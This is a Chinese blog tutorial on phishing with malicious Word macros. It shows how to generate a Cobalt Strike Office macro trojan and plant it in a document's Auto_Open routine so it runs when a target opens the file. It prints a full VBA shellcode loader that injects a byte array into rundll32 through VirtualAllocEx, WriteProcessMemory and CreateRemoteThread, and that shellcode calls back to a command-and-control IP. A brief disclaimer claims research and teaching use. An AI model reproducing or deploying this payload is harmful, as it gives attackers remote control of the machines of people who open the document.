

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/bt.jpg">
  <link rel="icon" href="/img/bt.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  
    <meta name="description" content="声明1注：本文所介绍所有工具仅限于安全研究和教学，用户承担因使用此工具而导致的所有法律和相关责任！ 作者不承担任何法律和相关责任！  一：本地加载恶意Word文档&#x2F;模板文件上线CS1、首先在CobaltStrike服务端启动  2、使用CobaltStrike生成宏木马选择office宏木马     选择监听器，然后再次点击Genarete     并且提示了使用步骤，此时我们将复制的内">
<meta property="og:type" content="article">
<meta property="og:title" content="通过制作wrold宏进行钓鱼">
<meta property="og:url" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/index.html">
<meta property="og:site_name" content="nf592">
<meta property="og:description" content="声明1注：本文所介绍所有工具仅限于安全研究和教学，用户承担因使用此工具而导致的所有法律和相关责任！ 作者不承担任何法律和相关责任！  一：本地加载恶意Word文档&#x2F;模板文件上线CS1、首先在CobaltStrike服务端启动  2、使用CobaltStrike生成宏木马选择office宏木马     选择监听器，然后再次点击Genarete     并且提示了使用步骤，此时我们将复制的内">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/1.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/2.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/3.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/4.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/5.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/6.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/7.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/8.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/9.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/10.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/11.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/12.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/15.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/16.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/17.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/18.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/19.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/20.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/21.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/22.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/13.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/14.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/23.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/24.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/25.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/26.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/27.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/28.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/12.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/29.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/30.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/31.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/32.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/33.png">
<meta property="og:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/34.png">
<meta property="article:published_time" content="2022-11-05T20:10:40.000Z">
<meta property="article:modified_time" content="2022-11-17T12:32:24.487Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="apt&#x2F;社工">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/1.png">
  
  
  
  <title>通过制作wrold宏进行钓鱼 - nf592</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>nanfeng</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/bj.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="通过制作wrold宏进行钓鱼"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2022-11-06 04:10" pubdate>
          2022年11月6日 凌晨
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          8.8k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          74 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">通过制作wrold宏进行钓鱼</h1>
            
            
              <div class="markdown-body">
                
                <h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">注：本文所介绍所有工具仅限于安全研究和教学，用户承担因使用此工具而导致的所有法律和相关责任！ 作者不承担任何法律和相关责任！<br></code></pre></td></tr></table></figure>

<h2 id="一：本地加载恶意Word文档-x2F-模板文件上线CS"><a href="#一：本地加载恶意Word文档-x2F-模板文件上线CS" class="headerlink" title="一：本地加载恶意Word文档&#x2F;模板文件上线CS"></a>一：本地加载恶意Word文档&#x2F;模板文件上线CS</h2><h2 id="1、首先在CobaltStrike服务端启动"><a href="#1、首先在CobaltStrike服务端启动" class="headerlink" title="1、首先在CobaltStrike服务端启动"></a>1、首先在CobaltStrike服务端启动</h2><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/1.png" srcset="/img/loading.gif" lazyload class="">

<h2 id="2、使用CobaltStrike生成宏木马"><a href="#2、使用CobaltStrike生成宏木马" class="headerlink" title="2、使用CobaltStrike生成宏木马"></a>2、使用CobaltStrike生成宏木马</h2><p>选择office宏木马</p>
<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/2.png" srcset="/img/loading.gif" lazyload class="">



<p>选择监听器，然后再次点击Genarete</p>
<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/3.png" srcset="/img/loading.gif" lazyload class="">



<p>并且提示了使用步骤，此时我们将复制的内容保存在文件1.txt中。</p>
<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/4.png" srcset="/img/loading.gif" lazyload class="">



<p>代码如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs shell">Private Type PROCESS_INFORMATION<br>    hProcess As Long<br>    hThread As Long<br>    dwProcessId As Long<br>    dwThreadId As Long<br>End Type<br><br>Private Type STARTUPINFO<br>    cb As Long<br>    lpReserved As String<br>    lpDesktop As String<br>    lpTitle As String<br>    dwX As Long<br>    dwY As Long<br>    dwXSize As Long<br>    dwYSize As Long<br>    dwXCountChars As Long<br>    dwYCountChars As Long<br>    dwFillAttribute As Long<br>    dwFlags As Long<br>    wShowWindow As Integer<br>    cbReserved2 As Integer<br>    lpReserved2 As Long<br>    hStdInput As Long<br>    hStdOutput As Long<br>    hStdError As Long<br>End Type<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">If VBA7 Then</span><br>    Private Declare PtrSafe Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr<br>    Private Declare PtrSafe Function Af Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr<br>    Private Declare PtrSafe Fon WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr<br>    Private Declare PtrSafe Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ls As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal ds As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long<br><span class="hljs-meta prompt_">#</span><span class="language-bash">Else</span><br>    Private Declare Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lr As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long<br>    Private Declare Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long<br>    Private Declare Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long<br>    Private Declare Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long<br><span class="hljs-meta prompt_">#</span><span class="language-bash">End If</span><br><br>Sub Auto_Open()<br>    Dim myByte As Long, myArray As Variant, offset As Long<br>    Dim pInfo As PROCESS_INFORMATION<br>    Dim sInfo As STARTUPINFO<br>    Dim sNull As String<br>    Dim sProc As String<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">If VBA7 Then</span><br>    Dim rwxpage As LongPtr, res As LongPtr<br><span class="hljs-meta prompt_">#</span><span class="language-bash">Else</span><br>    Dim rwxpage As Long, res As Long<br><span class="hljs-meta prompt_">#</span><span class="language-bash">End If</span><br>    myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, _<br>13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1, _<br>-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, _<br>-117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _<br>-43,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-124,0,0,0,91,49,-55,81,81,106,3,81,81,104,-72,34,0,0,83,80,104,87,-119,-97, _<br>-58,-1,-43,-21,112,91,49,-46,82,104,0,2,64,-124,82,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61,80,49,-1,87,87,106,-1,83,86, _<br>104,45,6,24,123,-1,-43,-123,-64,15,-124,-61,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1, _<br>-43,49,-1,87,106,7,81,86,80,104,-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,116,-73,49,-1,-23,-111,1,0,0,-23,-55,1,0,0,-24,-117,-1, _<br>-1,-1,47,65,75,106,102,0,-16,43,-21,76,-27,13,107,-7,-86,-55,122,109,118,38,113,-117,-61,-25,-23,-53,-84,-106,-13,-8,97,-70,108,61,-89,-97,-125,14, _<br>126,-38,-54,25,-75,-60,0,23,-10,-79,-94,-63,125,-119,101,-81,-125,-106,-94,98,65,-27,105,-118,-79,38,81,56,28,73,59,-47,-112,33,124,87,-127,-76,75,75, _<br>120,0,85,115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,53,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _<br>83,73,69,32,57,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,54,46,48,59,32,87,79,87,54,52,59,32,84,114,105,100,101,110,116,47, _<br>53,46,48,59,32,109,115,110,32,79,112,116,105,109,105,122,101,100,73,69,56,59,69,78,85,83,41,13,10,0,121,-59,-83,116,-90,-75,25,-80,-13,58, _<br>-9,31,-16,75,44,88,-75,43,-59,34,65,-11,-116,33,98,-122,1,-124,-114,-115,127,-116,-37,112,-89,-98,37,-28,69,121,-110,-43,-125,107,-117,-13,-100,-6,67,110, _<br>-98,-10,70,-68,119,-13,37,-88,-108,-107,-96,-2,-84,2,-115,-87,119,4,-96,-28,-85,103,20,-86,47,-53,-28,-112,18,81,74,-7,65,-80,8,38,-33,-15,21,-99, _<br>-44,11,-114,125,92,-57,-116,35,-88,-78,124,-55,-87,21,96,-65,42,-59,-33,-24,93,88,-125,93,-18,25,-2,-49,-28,-4,-82,17,11,88,-34,-12,-18,109,-29,-107, _<br>-108,-100,-23,42,121,-53,41,-17,81,121,93,110,21,126,-120,19,-29,55,120,-56,11,-30,-43,42,5,-25,18,48,79,-117,-59,121,-61,63,78,36,-16,-74,8,53, _<br>-21,124,44,32,15,123,-96,-76,68,69,-17,121,-21,-16,-127,113,-12,-101,-52,82,-35,81,-93,114,120,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0, _<br>104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43, _<br>-123,-64,116,-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-87,-3,-1,-1,49,57,50,46,49,54,56,46,50,51,46,49,50,57,0,25,105,-96,-115)<br>    If Len(Environ(&quot;ProgramW6432&quot;)) &gt; 0 Then<br>        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\SysWOW64\\rundll32.exe&quot;<br>    Else<br>        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\System32\\rundll32.exe&quot;<br>    End If<br><br>    res = RunStuff(sNull, sProc, ByVal 0&amp;, ByVal 0&amp;, ByVal 1&amp;, ByVal 4&amp;, ByVal 0&amp;, sNull, sInfo, pInfo)<br><br>    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;H1000, &amp;H40)<br>    For offset = LBound(myArray) To UBound(myArray)<br>        myByte = myArray(offset)<br>        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;)<br>    Next offset<br>    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)<br>End Sub<br>Sub AutoOpen()<br>    Auto_Open<br>End Sub<br>Sub Workbook_Open()<br>    Auto_Open<br>End Sub<br></code></pre></td></tr></table></figure>

<h2 id="3、创建使用的恶意宏world文件和模板"><a href="#3、创建使用的恶意宏world文件和模板" class="headerlink" title="3、创建使用的恶意宏world文件和模板"></a>3、创建使用的恶意宏world文件和模板</h2><p>创建一个文档，随后点击视图&#x2F;查看宏</p>
<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/5.png" srcset="/img/loading.gif" lazyload class="">



<p>宏名随便输入一个就可以，创建</p>
<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/6.png" srcset="/img/loading.gif" lazyload class="">



<p>在Project项目中的ThisDocument中添加CobaltStrike生成的宏代码，也就是刚刚我们保存在1.txt文本中的内容，并且右上角选择Auto_Open，在对方打开文档时，Word自动运行宏提示信息，提示是否点击</p>
<img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/7.png" srcset="/img/loading.gif" lazyload class="">



<p>Ctrl + S保存</p>
